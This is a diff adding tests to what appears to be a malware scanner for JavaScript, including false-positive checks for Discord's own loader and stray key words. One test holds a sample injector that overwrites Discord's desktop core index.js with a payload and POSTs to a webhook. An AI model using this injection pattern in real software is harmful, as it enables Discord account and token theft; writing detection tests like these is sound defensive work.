@@ -152,3 +152,21 @@ def test_huge_minified_script_is_fast(scan):
 def test_placeholder_discord_token_is_ignored(scan):
     text = b"const example = 'xxxxxxxxxxxxxxxxxxxxxxxx.xxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxx'; fetch('/api/settings');\n"
     assert scan("settings.js", text).verdict is Verdict.CLEAN
+
+
+def test_discord_loading_its_own_core_is_clean(scan):
+    code = b"const core = require(path.join(modulesDir, 'discord_desktop_core'));\nfetch('https://discord.com/api/v9/gateway');\n"
+    assert scan("bootstrap.js", code).verdict is Verdict.CLEAN
+
+
+def test_injecting_into_discord_is_caught(scan):
+    code = (b"const target = path.join(process.env.LOCALAPPDATA, 'Discord', 'app-1.0', 'modules', "
+            b"'discord_desktop_core-1', 'discord_desktop_core', 'index.js');\n"
+            b"fs.writeFileSync(target, payload);\nfetch('" + WEBHOOK.encode() + b"', {method: 'POST'});\n")
+    assert scan("injector.js", code).verdict is Verdict.DANGEROUS
+
+
+def test_one_stray_key_marker_is_not_a_keylogger(scan):
+    code = b"for (const k in keys) { delete obj[del]; }\nfetch('https://registry.yarnpkg.com/');\n"
+    report = scan("tool.js", code)
+    assert not any(f.check.endswith("keylog-text") for f in report.findings)
